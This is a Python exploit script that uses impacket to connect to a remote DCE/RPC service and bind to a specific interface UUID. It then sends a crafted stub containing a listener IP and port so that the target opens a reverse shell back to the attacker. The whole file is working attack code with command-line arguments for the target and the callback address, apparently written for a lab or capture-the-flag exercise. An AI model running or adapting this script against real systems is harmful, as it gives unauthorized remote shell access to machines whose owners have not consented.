import argparse
from impacket.structure import Structure
from impacket.uuid import uuidtup_to_bin
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.transport import DCERPCTransportFactory

parser = argparse.ArgumentParser()
parser.add_argument("-rip", help="Remote computer to target", dest="target_ip", type=str, required=True)
parser.add_argument("-rport", help="IP of the remote procedure listener", dest="port", type=int, required=True)
parser.add_argument("-lip", help="Local IP to receive the reverse shell", dest="lip", type=str, required=True)
parser.add_argument("-lport", help="Local port to receive the reverse shell", dest="lport", type=int, required=True)

args = parser.parse_args()
target_ip = args.target_ip
port = args.port
lip = args.lip
lport = args.lport

class SendReverseShell(Structure):
    global lip
    global lport
    print(lip, lport)
    format_ip = f"<{len(lip) + 1}s"
    structure = (
        # Yeah fuck this x)
        ('unknown', '<12s'),
        # <(Size of ip address + \x00)s
        ('ip_address', format_ip),
        # <5 - (Size of len(port)xh
        ('port', "<xxxi")
    )


# Create the string binding
stringBinding = r'ncacn_ip_tcp:{}[{}]'.format(target_ip, port)

# Connect to the remote endpoint
transport = DCERPCTransportFactory(stringBinding)
dce = transport.get_dce_rpc()
dce.connect()
print("[*] Connected to the remote target")

# Casts the UUID string and version of the interface into a UUID object
interface_uuid = uuidtup_to_bin(("AB4ED934-1293-10DE-BC12-AE18C48DEF33", "1.0"))
# Binds to the interface
dce.bind(interface_uuid)
print("[*] Binded to AB4ED934-1293-10DE-BC12-AE18C48DEF33")

print("[*] Formatting the client stub")
# Create the client stub and pack its data so it valid
query = SendReverseShell()
query['unknown'] = '\x0d\x00\x00\x00\x00\x00\x00\x00\x0d\x00\x00\x00'
query['ip_address'] = f"{lip}\x00"
query['port'] = lport
print("[*] Triggering the remote procedure")
try:
    # Call the function number 0 and pass the client stub
    dce.call(0, query)
    # Trying to read the answer, if we can then it's ok
    # if we can't then the client stub is not correct
    dce.recv()
except Exception as e:
    print(f"[!] ERROR: {e}")
    dce.disconnect()
print("[*] RPC triggered, disconecting from the server")
# Disconnecting from the remote target
dce.disconnect()
